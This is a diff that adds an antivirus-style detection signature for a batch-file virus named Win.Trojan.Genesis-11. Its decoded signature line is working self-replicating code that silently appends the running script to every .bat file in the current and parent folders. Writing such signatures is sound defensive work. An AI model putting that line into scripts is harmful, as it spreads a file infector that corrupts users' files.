@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Genesis-11
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: *
+DECODED SIGNATURE:
+for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
